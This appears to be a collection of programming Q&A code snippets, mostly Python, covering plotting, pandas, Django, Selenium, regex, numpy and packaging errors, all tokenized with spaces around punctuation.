"visible=True import pandas as pdimport numpy as npimport plotly.express as pximport string # create a dataframecols = list ( string.ascii_letters ) n = 50df = pd.DataFrame ( { 'Date ' : pd.date_range ( '2021-01-01 ' , periods=n ) } ) # create data with vastly different rangesfor col in cols : start = np.random.choice ( [ 1 , 10 , 100 , 1000 , 100000 ] ) s = np.random.normal ( loc=0 , scale=0.01*start , size=n ) df [ col ] = start + s.cumsum ( ) # melt data columns from wide to longdfm = df.melt ( `` Date '' ) fig = px.line ( data_frame=dfm , x = 'Date ' , y = 'value ' , facet_col = 'variable ' , facet_col_wrap=6 , facet_col_spacing=0.05 , facet_row_spacing=0.035 , height = 1000 , width = 1000 , title = 'Value vs . Date ' ) fig.update_yaxes ( matches=None , showticklabels=True , visible=True ) fig.update_annotations ( font=dict ( size=16 ) ) fig.for_each_annotation ( lambda a : a.update ( text=a.text.split ( `` = '' ) [ -1 ] ) ) import pandas as pdimport numpy as npimport plotly.express as pximport stringimport plotly.graph_objects as go # create a dataframecols = list ( string.ascii_letters ) n = 50df = pd.DataFrame ( { 'Date ' : pd.date_range ( '2021-01-01 ' , periods=n ) } ) # create data with vastly different rangesfor col in cols : start = np.random.choice ( [ 1 , 10 , 100 , 1000 , 100000 ] ) s = np.random.normal ( loc=0 , scale=0.01*start , size=n ) df [ col ] = start + s.cumsum ( ) # melt data columns from wide to longdfm = df.melt ( `` Date '' ) fig = px.line ( data_frame=dfm , x = 'Date ' , y = 'value ' , facet_col = 'variable ' , facet_col_wrap=6 , facet_col_spacing=0.05 , facet_row_spacing=0.035 , height = 1000 , width = 1000 , title = 'Value vs . Date ' ) fig.update_yaxes ( matches=None , showticklabels=True , visible=True ) fig.update_annotations ( font=dict ( size=16 ) ) fig.for_each_annotation ( lambda a : a.update ( text=a.text.split ( `` = '' ) [ -1 ] ) ) # hide subplot y-axis titles and x-axis titlesfor axis in fig.layout : if type ( fig.layout [ axis ] ) == go.layout.YAxis : fig.layout [ axis ] .title.text = `` if type ( fig.layout [ axis ] ) == go.layout.XAxis : fig.layout [ axis ] .title.text = `` # keep all other annotations and add single y-axis and x-axis title : fig.update_layout ( # keep the original annotations and add a list of new annotations : annotations = list ( fig.layout.annotations ) + [ go.layout.Annotation ( x=-0.07 , y=0.5 , font=dict ( size=16 , color = 'blue ' ) , showarrow=False , text= '' single y-axis title '' , textangle=-90 , xref= '' paper '' , yref= '' paper '' ) ] + [ go.layout.Annotation ( x=0.5 , y=-0.08 , font=dict ( size=16 , color = 'blue ' ) , showarrow=False , text= '' Dates '' , textangle=-0 , xref= '' paper '' , yref= '' paper '' ) ] ) fig.show ( )"
"Example 1 : nextline = `` DD : MM : YYYY INFO - 'WeeklyMedal : Hole = 1 ; Par = 4 ; Index = 2 ; Distance = 459 ; Score = { Player1 = 4 } ; '' Example 2 : nextline = `` DD : MM : YYYY INFO - 'WeeklyMedal : Hole = 1 ; Par = 4 ; Index = 2 ; Distance = 459 ; Score = { Player1 = 4 ; Player2 = 6 ; Player3 = 4 } ; '' Hole 1Par 4Index 2Distance 459Score Player1 4 Player2 6 Player3 4 split_line_by_semicolon = nextline.split ( `` : '' ) dictionary_of_line = dict ( ( k.strip ( ) , v.strip ( ) ) for k , v in ( item.split ( '= ' ) for item in split_line_by_semicolon.split ( ' ; ' ) ) ) for keys , values in dictionary_of_line.items ( ) : print ( `` { 0 } { 1 } '' .format ( keys , values ) ) ValueError : too many values to unpack ( expected 2 ) dictionary_of_line = dict ( ( k.strip ( ) , v.strip ( ) ) for k , v in ( item.split ( '=',1 ) for item in split_line_by_semicolon.split ( ' ; ' ) ) ) for keys , values in dictionary_of_line.items ( ) : print ( `` { 0 } { 1 } '' .format ( keys , values ) )"
a = a*2 if b == 2 else a = a/w
"# Historical ( 1950-2020 ) datancin_1 = Dataset ( `` /project/wca/AR5/CanESM2/monthly/histr1/tas_Amon_CanESM2_historical-r1_r1i1p1_195001-202012.nc '' ) # Import data filetash1 = ncin_1.variables [ 'tas ' ] [ : ] # extract tas ( temperature ) variablencin_1.close ( ) # close to save memory # Repeat for future ( 2021-2100 ) datancin_1 = Dataset ( `` /project/wca/AR5/CanESM2/monthly/histr1/tas_Amon_CanESM2_historical-r1_r1i1p1_202101-210012.nc '' ) tasr1 = ncin_1.variables [ 'tas ' ] [ : ] ncin_1.close ( ) # Concatenate historical & future files together to make one time series arraytas11 = np.concatenate ( ( tash1 , tasr1 ) , axis=0 ) # Subtract the 1950-1979 mean to obtain anomaliestas11 = tas11 - np.mean ( tas11 [ 0:359 ] , axis=0 , dtype=np.float64 ) # Move all tas data to one arrayalltas = np.zeros ( ( 1812,64,128,51 ) ) # years , lat , lon , members ( no ensemble mean value yet ) alltas [ : , : , : ,0 ] = tas11 ( ... ) alltas [ : , : , : ,49 ] = tas50 # Calculate ensemble mean & fill into 51st slot in axis 3alltas [ : , : , : ,50 ] = np.mean ( alltas , axis=3 , dtype=np.float64 )"
a=eval ( ' [ [ 0 ] *2 ] *2 ' ) a [ 0 ] [ 0 ] =1 a=eval ( ` [ [ 0 ] *2 ] *2 ` ) a [ 0 ] [ 0 ] =1
"Searching for requests-toolbeltReading https : //pypi.python.org/simple/requests_toolbelt/Best match : requests-toolbelt 0.3.1Downloading https : //pypi.python.org/packages/source/r/requests-toolbelt/requests-toolbelt-0.3.1.tar.gz # md5=e563377e46cd0be8c7b3ac144a65844cProcessing requests-toolbelt-0.3.1.tar.gzWriting /var/folders/m_/qltd_g_13qd1v5tvr4l6q2rc0000gn/T/easy_install-2lqn7g/requests-toolbelt-0.3.1/setup.cfgRunning requests-toolbelt-0.3.1/setup.py -q bdist_egg -- dist-dir /var/folders/m_/qltd_g_13qd1v5tvr4l6q2rc0000gn/T/easy_install-2lqn7g/requests-toolbelt-0.3.1/egg-dist-tmp-riz25eno previously-included directories found matching '*.pyc'warning : manifest_maker : MANIFEST.in , line 6 : 'recursive-include ' expects < dir > < pattern1 > < pattern2 > ... warning : manifest_maker : MANIFEST.in , line 7 : 'recursive-include ' expects < dir > < pattern1 > < pattern2 > ... no previously-included directories found matching 'docs/_build'zip_safe flag not set ; analyzing archive contents ... Adding requests-toolbelt 0.3.1 to easy-install.pth fileInstalled /Users/dhalperi/Envs/myria-python2/lib/python2.7/site-packages/requests_toolbelt-0.3.1-py2.7.eggSearching for requestsBest match : requests toolbelt-0.3.1Downloading https : //pypi.python.org/packages/source/r/requests-toolbelt/requests-toolbelt-0.3.1.tar.gz # md5=e563377e46cd0be8c7b3ac144a65844cProcessing requests-toolbelt-0.3.1.tar.gzWriting /var/folders/m_/qltd_g_13qd1v5tvr4l6q2rc0000gn/T/easy_install-LKxX9E/requests-toolbelt-0.3.1/setup.cfgRunning requests-toolbelt-0.3.1/setup.py -q bdist_egg -- dist-dir /var/folders/m_/qltd_g_13qd1v5tvr4l6q2rc0000gn/T/easy_install-LKxX9E/requests-toolbelt-0.3.1/egg-dist-tmp-3tgz5eno previously-included directories found matching '*.pyc'warning : manifest_maker : MANIFEST.in , line 6 : 'recursive-include ' expects < dir > < pattern1 > < pattern2 > ... warning : manifest_maker : MANIFEST.in , line 7 : 'recursive-include ' expects < dir > < pattern1 > < pattern2 > ... no previously-included directories found matching 'docs/_build'zip_safe flag not set ; analyzing archive contents ... requests-toolbelt 0.3.1 is already the active version in easy-install.pthInstalled /Users/dhalperi/Envs/myria-python2/lib/python2.7/site-packages/requests_toolbelt-0.3.1-py2.7.eggerror : Could not find required distribution requests"
"class MyBaseClass ( object ) : def __init__ ( self ) : self.description = `` self.command = `` def get_args ( self ) : # code that I ca n't figure out to specify argparse arguments here # args = [ ] # arg.append ( ... .. ) return args for module in find_modules ( ) : m = module ( ) subparser_dict [ module.__name__ ] = subparsers.add_parser ( m.command , help=m.help ) for arg in m.get_args ( ) : subparser_dict [ module.__name__ ] .add_argument ( ... ) subparser_dict [ module.__name__ ] .add_argument ( arg [ 'long-arg ' ] , action=arg [ 'action ' ] , nargs=arg [ 'nargs ' ] , const=arg [ 'const ' ] , default=arg [ 'default ' ] , type=arg [ 'type ' ] , choices=arg [ 'choices ' ] , required=arg [ 'required ' ] , help=arg [ 'help ' ] , metavar=arg [ 'metavar ' ] , dest=arg [ 'dest ' ] , )"
"( ? : ( ? : ( ? : rs ) | ( ? : inr ) ) ( ? : ! - { 0 , } |\ . { 1 } |\ { 0 , } |\ . { 1 } \ { 0 , } ) ) ( - ? [ \d , ] + ( ? : \.\d+ ) ? ) ( ? : [ ^/^-^X^x ] ) | ( ? : ( - ? [ \d , ] + ( ? : \.\d+ ) ? ) ( ? : ( ? : \ { 0 , } rs ) | ( ? : \ { 0 , } rs ) | ( ? : \ { 0 , } ( inr ) ) ) )"
"class Track ( models.Model ) : artist = models.ForeignKey ( Artist , blank=True , null=True , on_delete=models.SET_NULL , verbose_name= '' Artist '' ) title = models.CharField ( max_length=100 , verbose_name= '' Title '' ) year = models.PositiveSmallIntegerField ( null=True , blank=True , validators= [ MinValueValidator ( 1900 ) , MaxValueValidator ( datetime.datetime.now ( ) .year ) ] , verbose_name= '' Year '' ) timestamp = models.DateTimeField ( default=timezone.now )"
"list1 = [ 4,1,2,6 ] for elem in sorted ( list1 ) : # some task list1 = [ 4,1,2,6 ] list1 = sorted ( list1 ) for elem in list1 : # some task"
"from selenium import webdriver from selenium.webdriver.common.by import By from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC delay_time = 10 # how much time until raises NoExeption in Selenium driver = webdriver.Firefox ( ) driver.get ( `` http : //somedomain/url_that_delays_loading '' ) webDriverWait ( driver , delay_time ) \ .until ( EC.presence_of_element_located ( ( By.ID , 'IdOfMyElement ' ) ) ) ` < div id= '' div_39_1_3 '' class= '' Button CoachView CPP BPMHSectionChild CoachView_show '' data-type= '' com.ibm.bpm.coach.Snapshot_b24acf10_7ca3_40fa_b73f_782cddfd48e6.Button '' data-binding= '' local.clearButton '' data-bindingtype= '' boolean '' data-config= '' config175 '' data-viewid= '' GhostClear '' data-eventid= '' boundaryEvent_42 '' data-ibmbpm-layoutpreview= '' horizontal '' control-name= '' /GhostClear '' > < button class= '' btn btn-labeled '' > < span class= '' btn-label icon fa fa-times '' > < /span > Clear < /button > < /div >"
files= ` ls -1 * ` for $ file in $ files ; do out = $ file+= '' .out '' python fastq_groom.py $ file $ outdone
"# Reserves a product when it is placed in the cartdef reserve_cart_product ( product ) : log.debug ( `` Reserving % s '' % product.name ) product.active = False product.featured = False product.save ( ) from threading import Timer Timer ( CART_RESERVE_TIME , check_reservation , ( product , ) ) .start ( )"
def somefunctionname ( list ) : `` ' some computation performed on list '' ' return float value exec ( `` import `` +modulename ) result = eval ( f '' { modulename } . { somefunctionname } ( arguments ) '' )
"import timeimport numpy as npdataMat1 = np.random.rand ( 1000,1000 ) dataMat2 = np.random.rand ( 2,500000 ) dataMat3 = np.random.rand ( 500000,2 ) start = time.perf_counter ( ) with open ( 'test1.txt ' , ' w ' ) as f : np.savetxt ( f , dataMat1 , fmt= ' % g ' , delimiter= ' ' ) end = time.perf_counter ( ) print ( end-start ) start = time.perf_counter ( ) with open ( 'test2.txt ' , ' w ' ) as f : np.savetxt ( f , dataMat2 , fmt= ' % g ' , delimiter= ' ' ) end = time.perf_counter ( ) print ( end-start ) start = time.perf_counter ( ) with open ( 'test3.txt ' , ' w ' ) as f : np.savetxt ( f , dataMat3 , fmt= ' % g ' , delimiter= ' ' ) end = time.perf_counter ( ) print ( end-start )"
"class Data ( object ) : products = { 'milk ' : { 'price ' : 1.50 , 'quantity ' : 10 } , 'eggs ' : { 'price ' : 0.20 , 'quantity ' : 100 } , 'cheese ' : { 'price ' : 2.00 , 'quantity ' : 10 } } def __get__ ( self , obj , klas ) : print `` Here in descriptor '' return self.productsclass BusinessLogic ( object ) : def __init__ ( self ) : # When I remove these 2 lines self.data = Data ( ) # data = Data ( ) # and enable this line it does work ! def main ( ) : b = BusinessLogic ( ) b.dataif __name__ == '__main__ ' : main ( )"
python setup.py develop
"content = Content ( `` text/html '' , verification_email.format ( user [ `` first_name '' ] , url_for ( `` register.display_register_form '' , token=token.decode ( `` utf-8 '' ) , external=True ) ) ) http : ///register_account/DnsJpXw_QIcPYeDHEg_fipB2kRiJBUj2RI6I9cI4Yl4w6K9ohbZRMVqBInuV0aOsBT4Zqt69X8MfhNfnys4s-DAQmgu1OPBwmSQnzAELvdcCyiZtkJGSY8_dQ799FOewtBDkvqR1D8XHmvVxgaVqbwSjdEBnvFsBBHMQCic % 3D/verify ? external=True http : //my-server-58140.herokuapp.com/home SERVER_NAME = os.environ.get ( 'SERVER_NAME ' ) DEBUG = TrueBASE_DIR = os.path.abspath ( os.path.dirname ( __file__ ) )"
"================================================================================================================================================ test session starts ================================================================================================================================================platform darwin -- Python 3.6.2 , pytest-3.8.1 , py-1.5.4 , pluggy-0.7.1 -- /yyy/venv/bin/python3.6cachedir : .pytest_cacherootdir : /yyy/corporategovernance , inifile : setup.cfgplugins : timeout-1.3.1 , cov-2.5.1 , populus-1.9.0 , flaky-3.4.0 , celery-4.1.0 , splinter-1.8.5+headlesscollecting 0 items / 1 errors ====================================================================================================================================================== ERRORS =======================================================================================================================================================_________________________________________________________________________________________________________________________________ ERROR collecting corporategovernance/__init__.py __________________________________________________________________________________________________________________________________../venv/lib/python3.6/site-packages/_pytest/config/__init__.py:381 : in _getconftestmodules return self._path2confmods [ path ] E KeyError : local ( '/xxx/tests ' ) During handling of the above exception , another exception occurred : ../venv/lib/python3.6/site-packages/_pytest/config/__init__.py:412 : in _importconftest return self._conftestpath2mod [ conftestpath ] E KeyError : local ( '/xxx/tests/conftest.py ' ) During handling of the above exception , another exception occurred : ../venv/lib/python3.6/site-packages/_pytest/config/__init__.py:418 : in _importconftest mod = conftestpath.pyimport ( ) ../venv/lib/python3.6/site-packages/py/_path/local.py:668 : in pyimport __import__ ( modname ) ../venv/lib/python3.6/site-packages/_pytest/assertion/rewrite.py:290 : in load_module six.exec_ ( co , mod.__dict__ ) corporategovernance/tests/conftest.py:4 : in < module > import corporategovernance.backendE ModuleNotFoundError : No module named 'corporategovernance.backend'During handling of the above exception , another exception occurred : ../venv/lib/python3.6/site-packages/_pytest/runner.py:201 : in __init__ self.result = func ( ) ../venv/lib/python3.6/site-packages/_pytest/runner.py:261 : in < lambda > call = CallInfo ( lambda : list ( collector.collect ( ) ) , `` collect '' ) ../venv/lib/python3.6/site-packages/_pytest/python.py:624 : in collect for x in self._collectfile ( path ) : ../venv/lib/python3.6/site-packages/_pytest/python.py:579 : in _collectfile ihook = self.gethookproxy ( path ) ../venv/lib/python3.6/site-packages/_pytest/python.py:568 : in gethookproxy my_conftestmodules = pm._getconftestmodules ( fspath ) ../venv/lib/python3.6/site-packages/_pytest/config/__init__.py:395 : in _getconftestmodules mod = self._importconftest ( conftestpath ) ../venv/lib/python3.6/site-packages/_pytest/config/__init__.py:431 : in _importconftest raise ConftestImportFailure ( conftestpath , sys.exc_info ( ) ) E _pytest.config.ConftestImportFailure : ModuleNotFoundError ( `` No module named 'corporategovernance.backend ' '' , ) E File `` /yyy/venv/lib/python3.6/site-packages/_pytest/assertion/rewrite.py '' , line 290 , in load_moduleE six.exec_ ( co , mod.__dict__ ) E File `` /xxx/tests/conftest.py '' , line 4 , in < module > E import corporategovernance.backend===Flaky Test Report==="
"from django.contrib.auth.models import AbstractUserfrom django.contrib.sites.models import Sitefrom django.contrib.sites.managers import CurrentSiteManagerclass Member ( AbstractUser ) : username = None site = models.ForeignKey ( Site ) USERNAME_FIELD = 'email ' REQUIRED_FIELDS = [ ] on_site = CurrentSiteManager ( ) class Meta : unique_together = ( 'site ' , 'email ' )"
library ( xml2 ) myxml < - read_xml ( ' < data > < obs ID= '' a '' > < name > John < /name > < hobby > tennis < /hobby > < hobby > golf < /hobby > < skill > python < /skill > < /obs > < obs ID= '' b '' > < name > Robert < /name > < skill > R < /skill > < /obs > < /data > ' ) myxml % > % xml_find_all ( `` //name '' ) % > % xml_text ( ) myxml % > % xml_find_all ( `` //hobby '' ) % > % xml_text ( ) # A tibble : 2 × 3 name hobby skill < chr > < chr > < chr > 1 John tennis|golf python2 Robert < NA > R
"def remove_empty ( fn ) : def filtered ( ) : return filter ( lambda x : x ! = `` , fn ( ) ) return filtered some_string.split ( '\n ' )"
"y : array-like , shape ( n_samples , ) or ( n_samples , n_targets ) In [ 2 ] : import numpy as np imIn [ 3 ] : import sklearn.linear_modelIn [ 4 ] : from sklearn import linear_modelIn [ 5 ] : X = np.random.random ( ( 10,100 ) ) In [ 6 ] : y = np.random.random ( ( 50 , 100 ) ) In [ 7 ] : linear_model.Lasso ( ) .fit ( X , y ) Out [ 7 ] : Lasso ( alpha=1.0 , copy_X=True , fit_intercept=True , max_iter=1000 , normalize=False , positive=False , precompute='auto ' , tol=0.0001 , warm_start=False ) In [ 8 ] : linear_model.LassoCV ( ) .fit ( X , y ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -ValueError Traceback ( most recent call last ) < ipython-input-8-9c8ad3459ac8 > in < module > ( ) -- -- > 1 linear_model.LassoCV ( ) .fit ( X , y ) /chimerahomes/wenhoujx/Enthought/Canopy_64bit/User/lib/python2.7/site-packages/sklearn/linear_model/coordinate_descent.pyc in fit ( self , X , y ) 1006 if y.ndim > 1 : 1007 raise ValueError ( `` For multi-task outputs , use `` - > 1008 `` MultiTask % sCV '' % ( model_str ) ) 1009 else : 1010 if sparse.isspmatrix ( X ) : ValueError : For multi-task outputs , use MultiTaskLassoCVIn [ 9 ] :"
"reduce ( lambda x , y : x+y , [ m.toarray ( ) for m in my_sparse_matrices ] ) import numpy as npimport numpy.randomimport scipyimport scipy.sparseimport timeN=768S=768D=3def mkrandomsparse ( ) : m=np.zeros ( ( S , S ) , dtype=np.float32 ) r=np.random.random_integers ( 0 , S-1 , D*S ) c=np.random.random_integers ( 0 , S-1 , D*S ) for e in zip ( r , c ) : m [ e [ 0 ] , e [ 1 ] ] =1.0 return scipy.sparse.csr_matrix ( m ) M= [ mkrandomsparse ( ) for i in xrange ( N ) ] def plus_dense ( ) : return reduce ( lambda x , y : x+y , [ m.toarray ( ) for m in M ] ) def plus_sparse ( ) : return reduce ( lambda x , y : x+y , M ) .toarray ( ) def sum_dense ( ) : return sum ( [ m.toarray ( ) for m in M ] ) def sum_sparse ( ) : return sum ( M [ 1 : ] , M [ 0 ] ) .toarray ( ) def sum_combo ( ) : # Sum the sparse matrices 'onto ' a dense matrix ? return sum ( M , np.zeros ( ( S , S ) , dtype=np.float32 ) ) def benchmark ( fn ) : t0=time.time ( ) fn ( ) t1=time.time ( ) print `` { 0:16 } : { 1 : .3f } s '' .format ( fn.__name__ , t1-t0 ) for i in xrange ( 4 ) : benchmark ( plus_dense ) benchmark ( plus_sparse ) benchmark ( sum_dense ) benchmark ( sum_sparse ) benchmark ( sum_combo ) print plus_dense : 1.368splus_sparse : 1.405ssum_dense : 1.368ssum_sparse : 1.406ssum_combo : 1.039s"
date_cols = [ ] df = cleaned_datadate_pattern = re.compile ( '\d { 2 } /\d { 2 } /\d { 4 } \d { 2 } : \d { 2 } ' ) for column in df : if date_pattern.search ( str ( item ) ) : date_cols += [ column ] return date_cols
"def wrap ( f ) : def wrapped_f ( *args , **kwargs ) : # do something return wrapped_f @ wrapdef A ( params ) : # do somethingprint ( A.__name__ )"
"import psycopg2 as pgimport pandas.io.sql as psql # Some SQL code : my_query = '' 'select count ( distinct s.object_uid ) from dx.dx_segment as s ; ' '' # end of SQL codedataframe = psql.frame_query ( my_query , connection )"
"> > > re.search ( r '' \by\b '' , '' üyü '' ) < _sre.SRE_Match object at 0x02819E58 > > > > re.search ( r '' \by\b '' , '' ğyğ '' ) < _sre.SRE_Match object at 0x028250C8 > > > > re.search ( r '' \by\b '' , '' uyu '' ) > > >"
"s = pd.Series ( [ ' a ' , ' b ' , ' a ' , ' b ' ] , dtype='category ' ) s.to_hdf ( 's.h5 ' , 's ' )"
"from pymouse import PyMouseimport timem = PyMouse ( ) i=1for i in range ( 1,1000 ) : time.sleep ( 2 ) x , y = m.position ( ) print ( x , y ) m.click ( x , y,1 ) i+=1 print ( m.position ( ) )"
"df1 = pd.DataFrame ( { 'first ' : [ 'John ' , 'Mary ' , 'Larry ' , 'jerry ' ] , ' 1 ' : [ 5.5 , 6.0,10,20 ] , ' 2 ' : [ 100 , 200 , 300 , 400 ] , ' 3 ' : [ 150 , 100 , 240 , 110 ] , 'offset ' : ( [ 1,0,2,1 ] ) } ) goal_df = pd.DataFrame ( { 'first ' : [ 'John ' , 'Mary ' , 'Larry ' , 'jerry ' ] , ' 1 ' : [ 0.0 , 6.0 , 0.0 , 0 ] , ' 2 ' : [ 5.5 , 200 , 0.0 , 20 ] , ' 3 ' : [ 100 , 100 , 10 , 400 ] , ' 4 ' : [ 150 , 0.0 , 300 , 110 ] , ' 5 ' : [ 0.0 , 0.0 , 240 , 0.0 ] } ) df11 2 3 first offset5.5 100 150 John 16.0 200 100 Mary 010.0 300 240 Larry 220.0 400 110 jerry 1goal_df1 2 3 4 5 first0 5.5 100 150 0 John6 200.0 100 0 0 Mary0 0.0 10 300 240 Larry0 20.0 400 110 0 jerry"
"class myCallable : def __init__ ( self , doc ) : self.__doc__ = doc def __call__ ( self ) : # do some stuff passmyFunc = myCallable ( `` some doco text '' ) help ( myFunc ) def myFunc ( ) : `` some doco text '' # do some stuff passhelp ( myFunc )"
"x = 5def foo ( ) : print xfoo ( ) import __builtin__global_env = { '__builtins__ ' : __builtin__ } local_env = dict ( ) exec `` '' '' x = 5def foo ( ) : print xfoo ( ) '' '' '' in global_env , local_env Traceback ( most recent call last ) : File `` lab.py '' , line 94 , in < module > `` '' '' in global_env , local_env File `` < string > '' , line 5 , in < module > File `` < string > '' , line 4 , in fooNameError : global name ' x ' is not defined print global_envprint local_env { '__builtins__ ' : < module '__builtin__ ' ( built-in ) > } { ' x ' : 5 , 'foo ' : < function foo at 0x102c12938 > } exec `` '' '' x = 5def foo ( ) : global x print xfoo ( ) '' '' '' in global_env , local_env exec `` '' '' x = 5def foo ( ) : print xfoo ( ) '' '' '' in global_env"
"# Assume I have initialized a DataFrame ( called `` all '' ) which contains my large dataset , # with a boolean column called `` test '' which indicates whether a record should be used for # testing.print len ( all ) # 10000000 test = all.pop_large_segment ( all [ test ] ) # not a real command , just a place holderprint len ( all ) # 8000000print len ( test ) # 2000000"
"pyodbc.Error : ( 'IM002 ' , ' [ IM002 ] [ Microsoft ] [ ODBC Driver Manager ] Data source name not found and no default driver specified ( 0 ) ( SQLDriverConnect ) ' )"
"X = randn ( 25,25,25 ) ; size ( X ( : , : ) ) ans = 25 625 In [ 22 ] : x = np.random.randn ( 25,25,25 ) In [ 23 ] : x = x.reshape ( x.shape [ : -2 ] + ( -1 , ) ) In [ 24 ] : x.shapeOut [ 24 ] : ( 25 , 625 ) In [ 25 ] : x = np.random.randn ( 25,25,25 ) In [ 26 ] : x [ : , : ] .shapeOut [ 26 ] : ( 25 , 25 , 25 )"
"import cv2import numpy as npprvs = np.zeros ( ( 100,80 ) , dtype=np.float32 ) prvs [ 50:51 , 50:51 ] = 1.grid_x , grid_y = np.meshgrid ( np.arange ( prvs.shape [ 1 ] ) , np.arange ( prvs.shape [ 0 ] ) ) grid_y = grid_y.astype ( np.float32 ) grid_x = grid_x.astype ( np.float32 ) + 0.1prvs_remapped = cv2.remap ( prvs , grid_x , grid_y , interpolation=cv2.INTER_LINEAR ) print ( prvs_remapped [ 50,50 ] ) print ( prvs_remapped [ 50,49 ] ) 0.906250.09375"
"'my_package/static/my_folder ' not a regular file -- skipping `` error : ca n't copy 'my_package/static/my_folder ' : does n't exist or not a regular file . recursive-include my_package *.css *.js *.jinja2 try : from setuptools import setup , find_packagesexcept ImportError : from distutils.core import setup , find_packagessetup ( name='my_package ' , packages=find_packages ( ) , include_package_data=True , platforms='any ' , version= ' 1.0 ' , description='my_description ' , license='MIT ' , author='Me ' , author_email='me @ example.com ' , install_requires= [ 'Flask ' , 'Jinja2 ' , 'requests ' , ] , url='http : //www.example.com ' , download_url='https : //github.com/me/my_package/tarball/1.0 ' , classifiers= [ 'License : : OSI Approved : : MIT License ' , ] , )"
"# ! /usr/bin/env python # -*- coding : utf-8 -*-import configobjimport iodef main ( ) : `` '' '' Main stuff '' '' '' input_config = `` '' '' [ Header ] author = PloucPlouc description = Test config [ Study ] name_of_study = Testing version = 9999 `` '' '' # Just not to trust my default encoding input_config = unicode ( input_config , `` utf-8 '' ) test_config_fileio = io.StringIO ( input_config ) print configobj.ConfigObj ( infile=test_config_fileio , encoding= '' UTF8 '' ) if __name__ == `` __main__ '' : main ( ) Traceback ( most recent call last ) : File `` test_configobj.py '' , line 101 , in < module > main ( ) File `` test_configobj.py '' , line 98 , in main print configobj.ConfigObj ( infile=test_config_fileio , encoding='UTF8 ' ) File `` /work/irlin168_1/USER/Apps/python272/lib/python2.7/site-packages/configobj-4.7.2-py2.7.egg/configobj.py '' , line 1242 , in __init__ self._load ( infile , configspec ) File `` /work/irlin168_1/USER/Apps/python272/lib/python2.7/site-packages/configobj-4.7.2-py2.7.egg/configobj.py '' , line 1302 , in _load infile = self._handle_bom ( infile ) File `` /work/irlin168_1/USER/Apps/python272/lib/python2.7/site-packages/configobj-4.7.2-py2.7.egg/configobj.py '' , line 1442 , in _handle_bom if not line.startswith ( BOM ) : UnicodeDecodeError : 'ascii ' codec ca n't decode byte 0xef in position 0 : ordinal not in range ( 128 ) > > > config = ConfigObj ( 'config.ini ' , encoding='UTF8 ' ) > > > config [ 'name ' ] u'Michael Foord ' [ ... ] A StringIO instance or file object , or any object with a read method . The filename attribute of your ConfigObj will be None [ 5 ] . input_config = unicode ( input_config , `` utf8 '' ) input_config = unicode ( input_config , `` utf8 '' ) .strip ( codecs.BOM_UTF8.decode ( `` utf8 '' , `` strict '' ) )"
"> > > st = `` a & b '' > > > st.replace ( ' & ' , '\\ ' ) ' a\\b '"
a = np.arange ( 10 ) b = np.arange ( 10 ) a [ 3 : ] += a [ : -3 ] b [ 3 : ] = b [ 3 : ] + b [ : -3 ] print a # [ 0 1 2 3 5 7 9 12 15 18 ] print b # [ 0 1 2 3 5 7 9 11 13 15 ]
# Mag Weight21.9786 3.678224.0305 6.112021.9544 4.222523.9383 5.137523.9352 4.649923.0261 5.135523.8682 5.993224.8052 4.176522.8976 5.190123.9679 4.319025.3362 4.151924.9079 4.209023.9851 5.195122.2094 5.157022.3452 5.615924.0953 6.269724.3901 6.929924.1789 4.022224.2648 4.499725.3931 3.392025.8406 3.958723.1427 6.939821.2985 7.758225.4807 3.111225.1935 5.091325.2136 4.057824.6990 3.989923.5299 4.678824.0880 7.057624.7931 5.708825.1860 3.482524.4757 5.850024.1398 4.984223.4947 4.473020.9806 5.271725.9470 3.470625.0324 3.387924.7186 3.844324.3350 4.914024.6395 5.075723.9181 4.995124.3599 4.112524.1766 5.436024.8378 4.912124.7362 4.423724.4119 6.164823.8215 5.918421.5394 5.154224.0081 4.230824.5665 4.692223.5827 5.499223.3876 6.369225.6872 4.505523.6629 5.441624.4821 4.792222.7522 5.951324.0640 5.896324.0361 5.640624.8687 4.569924.8795 4.319824.3486 4.530521.0720 9.524625.2960 3.082823.8204 5.860523.3732 5.116125.5097 2.901024.9206 4.099924.4140 4.907322.7495 4.505924.3394 3.506122.0560 5.576325.4404 5.491625.4795 4.408924.1772 3.862623.6042 4.747623.3537 6.480423.6842 4.322024.1895 3.607224.0328 4.327323.0243 5.678925.7042 4.449322.1983 6.186822.3661 5.913220.9426 4.807920.3806 10.112825.0105 4.429623.6648 6.648225.2780 4.493324.6870 4.483625.4565 4.099025.0415 3.938424.6098 4.605724.7796 4.2042
"@ classmethoddef from_list ( cls , results_list , column_key ) : `` '' '' Populate object from a list of results that all share the metadata except for the field ` column_key ` . `` '' '' # Need two copies of the input results - one for building the object # data and one for building the object metadata for_data , for_metadata = itertools.tee ( results_list ) self = cls ( ) self.column_key = column_key self.metadata = next ( for_metadata ) .metadata.copy ( ) if column_key in self.metadata : del self.metadata [ column_key ] self.data = pandas.DataFrame ( dict ( ( ( transform ( r [ column_key ] ) , r.data ) for r in for_data ) ) ) return self"
"class Products ( models.Model ) : name = models.CharField ( max_length=600 , blank=True ) brand = models.CharField ( max_length=300 , blank=True ) created_at = models.DateTimeField ( auto_now_add=True ) updated_at = models.DateTimeField ( auto_now=True ) class Attributes ( models.Model ) : name = models.CharField ( max_length=600 ) product = models.ManyToManyField ( Products , through= '' AttributesMapping '' , related_name= '' attributes '' ) class AttributesMapping ( models.Model ) : attribute = models.ForeignKey ( Attributes ) product = models.ForeignKey ( Products ) value = models.TextField ( blank=True ) { % for attribute in product.attributes.all % } { { attribute.name } } : { { attribute.value } } { % endfor % } SELECT ` attributes ` . ` id ` , ` attributes ` . ` name ` FROM ` attributes ` INNER JOIN ` attributes_mapping ` ON ( ` attributes ` . ` id ` = ` attributes_mapping ` . ` attribute_id ` ) WHERE ` attributes_mapping ` . ` product_id ` = 1"
